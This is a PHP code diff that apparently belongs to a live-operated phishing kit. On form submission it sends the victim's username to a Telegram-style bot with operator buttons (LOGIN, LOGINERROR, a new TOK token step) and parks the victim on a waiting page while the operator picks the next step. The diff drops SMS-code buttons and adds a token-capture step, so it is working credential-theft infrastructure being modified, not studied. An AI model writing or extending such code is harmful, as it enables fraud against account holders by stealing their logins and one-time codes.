@@ -25,16 +25,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $keyboard = json_encode([
         'inline_keyboard' => [
             [
-                ['text' => '✅ SMS',        'callback_data' => "SMS|$usuario"],
-                ['text' => '❌ SMSERROR',   'callback_data' => "SMSERROR|$usuario"],
-            ],
-            [
                 ['text' => '✅ LOGIN',      'callback_data' => "LOGIN|$usuario"],
                 ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|$usuario"],
             ],
             [
-                ['text' => '🏁 LISTO',     'callback_data' => "LISTO|$usuario"],
-                ['text' => '🚫 ERROR',     'callback_data' => "ERROR|$usuario"],
+                ['text' => '🔑 TOK',       'callback_data' => "TOK|$usuario"],
             ],
         ]
     ]);
@@ -46,7 +41,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'reply_markup' => $keyboard,
     ]));
 
-    header('Location: token.php?u=' . urlencode($usuario));
+    header('Location: ../espera.php?u=' . urlencode($usuario) . '&step=login');
     exit;
 }
 ?>
